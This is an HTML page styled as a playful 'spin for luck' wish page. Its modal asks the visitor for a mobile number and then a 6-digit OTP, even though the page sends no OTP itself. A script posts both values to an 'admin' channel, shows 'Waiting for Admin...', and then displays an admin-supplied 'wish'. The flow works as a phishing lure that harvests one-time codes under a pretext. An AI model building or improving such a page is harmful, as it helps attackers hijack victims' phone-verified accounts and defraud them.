<!DOCTYPE html>
<html>
<head>
  <title>User Wish Page</title>
  <style>
    body {
      font-family: Arial;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      text-align: center;
      padding-top: 100px;
    }

    button {
      padding: 12px 25px;
      font-size: 16px;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      background: gold;
      color: black;
      min-width: 180px;
    }

    button.loading {
      background: #ccc;
      cursor: not-allowed;
    }

    .modal {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.6);
    }

    .modal-content {
      background: white;
      color: black;
      width: 320px;
      margin: 15% auto;
      padding: 20px;
      border-radius: 12px;
      text-align: center;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
    }

    #wishBox {
      margin-top: 40px;
      font-size: 26px;
      font-weight: bold;
      color: #ffeb3b;
    }

    .spin {
      display: inline-block;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>

<body>

<h1>üå∏ Welcome Beautiful Soul üå∏</h1>
<p>Spin & wait for luck üòÑ</p>

<button onclick="openModal()">Spin</button>

<div class="modal" id="modal">
  <div class="modal-content">

    <div id="step1">
      <h3>Enter Mobile Number</h3>
      <input id="mobile" placeholder="Mobile Number" />
      <button onclick="sendOtp()">Send OTP</button>
    </div>

    <div id="step2" style="display:none;">
      <h3>Enter OTP</h3>
  <input id="otp" placeholder="Enter 6-digit OTP " />
      <button id="verifyBtn" onclick="verifyOtp()">Verify OTP</button>
    </div>

  </div>
</div>

<div id="wishBox"></div>

<script>
  const channel = new BroadcastChannel("wish_channel");

  function openModal() {
    document.getElementById("modal").style.display = "block";
  }

  function sendOtp() {
    const mobile = document.getElementById("mobile").value;
    if (!mobile) return alert("Enter mobile number");

    document.getElementById("step1").style.display = "none";
    document.getElementById("step2").style.display = "block";
  }

  function verifyOtp() {
    const mobile = document.getElementById("mobile").value;
    const otp = document.getElementById("otp").value;

    if (!otp || otp.length !== 6) {
      return alert("Enter 6-digit OTP");
    }

    const btn = document.getElementById("verifyBtn");
    btn.classList.add("loading");
    btn.innerHTML = '<span class="spin">‚è≥</span> Waiting for Admin...';

    // send data to admin
    channel.postMessage({
      type: "USER_SUBMIT",
      data: { mobile, otp }
    });

    document.getElementById("modal").style.display = "none";
  }

  channel.onmessage = (event) => {
    if (event.data.type === "ADMIN_WISH") {
      document.getElementById("wishBox").innerText = event.data.message;
    }
  };
</script>

</body>
</html>
